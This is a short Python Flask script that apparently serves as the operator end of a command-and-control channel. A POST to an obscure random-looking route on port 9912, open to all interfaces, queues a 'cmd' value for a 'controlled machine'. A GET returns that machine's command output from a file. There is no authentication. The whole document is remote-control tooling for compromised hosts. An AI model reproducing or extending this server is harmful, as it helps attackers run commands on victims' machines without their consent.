from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/XccO0aZ1230610086', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        result = ""
        with open("cmdresult.txt", "r") as f:
            result = f.read()
        return result
    else:
        cmd = request.form.get('cmd')
        with open("cmd.txt", "w") as f:
            f.write(cmd+"\n")
        return "Waiting for Controlled machine's reply......"

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=9912)


